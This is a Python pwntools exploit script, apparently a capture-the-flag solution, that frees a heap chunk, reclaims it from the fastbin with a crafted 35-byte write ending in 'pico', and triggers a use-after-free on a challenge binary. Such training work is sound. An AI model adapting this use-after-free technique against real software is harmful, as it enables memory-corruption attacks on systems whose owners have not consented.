#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No
# Debuginfo:  Yes

io = start()

io.info("x is 35 bytes (technically the chunk has 0x30 bytes + 16 bytes header but we don't care here")
io.info("we can free x, allocate a new chunk to grab it from the fastbin, write, then UAF")
io.info("=" * 60)

io.readuntil(b"Enter your choice:")

io.info("freeing x")
io.sendline(b"5")
io.info("allocating and overwriting...")
io.sendline(b"2")
io.sendline(b"35")
io.sendline(b"A" * 10 + b"B" * 10 + b"C" * 10 + b"pico")
io.success("triggering UAF....")
io.sendline("4")

io.interactive()

